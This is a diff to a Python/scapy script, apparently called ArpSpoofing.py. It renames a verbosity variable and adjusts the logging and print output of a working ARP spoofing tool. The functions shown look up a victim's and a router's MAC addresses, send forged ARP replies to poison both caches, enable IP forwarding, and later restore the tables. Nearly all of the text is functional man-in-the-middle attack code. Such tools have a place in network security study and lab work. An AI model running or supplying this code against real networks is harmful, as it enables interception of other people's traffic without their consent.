@@ -1,3 +1,7 @@
+# Suppresses the WARNING Message
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 import argparse
 import regex
 from scapy.all import *
@@ -9,7 +13,7 @@ victimIP = ""
 routerIP = ""
 
 # Turns on or off scapy messages
-scapyVerbose = 0
+verbose = 0
 
 # Variables for MAC address
 victimMAC = None
@@ -20,14 +24,15 @@ def print_force(string):
     """This method is required because when this python file is called as a script
     the prints don't appear and a flush is required """
 
-    print(string)
-    sys.stdout.flush()
+    if verbose is 1:
+        print(string)
+        sys.stdout.flush()
 
 
 def grab_MAC(IP):
     """Manipulates the packet layers to obtain the MAC address from the returned values"""
 
-    ans, uans = arping(IP, verbose=scapyVerbose)
+    ans, uans = arping(IP, verbose=verbose)
     for s, r in ans:
         return r[Ether].src
 
@@ -42,9 +47,9 @@ def grab_MAC_Addresses():
 
     if victimMAC is not None and routerMAC is not None:
         loop = False
-        print_force("[!] MAC Addresses obtain successfully!")
-        print_force("[*] Router mac: \'", routerMAC, '\'')
-        print_force("[*] Victim mac: \'", victimMAC, '\'')
+        print("[!] MAC Addresses obtain successfully - ARP spoof starting!", flush=True)
+        print_force("[*] Router mac: \'{}\'".format(routerMAC))
+        print_force("[*] Victim mac: \'{}\'".format(victimMAC))
     else:
         exit("[!] Error obtaining MAC Addresses, Arp spoofing stopped!")
 
@@ -56,8 +61,8 @@ def spoof(routerIP, victimIP):
     #   "op = 2" - '2' is the opcode for a reply
 
     print_force("[*] Spoofing")
-    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
-    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)
+    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=verbose)
+    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=verbose)
 
 
 def restore(routerIP, victimIP):
@@ -65,16 +70,18 @@ def restore(routerIP, victimIP):
 
     # Restores the original config
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=victimMAC), count=4, verbose=scapyVerbose)
+             hwsrc=victimMAC), count=4, verbose=verbose)
 
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=routerMAC), count=4, verbose=scapyVerbose)
+             hwsrc=routerMAC), count=4, verbose=verbose)
 
 
 def set_ip_forward(state):
     """Method used to configure the host packet forwarding"""
 
     if state is True:
+
+        print('[*] ', end='', flush=True)
         # This config has been tested only on Arch linux
         os.system("sysctl net.ipv4.ip_forward=1")
 
@@ -136,7 +143,7 @@ def parameters():
     global victimIP
     global routerIP
     global interface
-    global scapyVerbose
+    global verbose
 
     parser = argparse.ArgumentParser(prog="ArpSpoofing.py")
     parser.add_argument('-t', action='store', help='Specifies the target IP', metavar='Target_IP', required=True)
@@ -152,7 +159,7 @@ def parameters():
     if args.i:
         interface = args.i
     if args.v:
-        scapyVerbose = 1
+        verbose = 1
 
     # Validation
     valid_ip(victimIP)
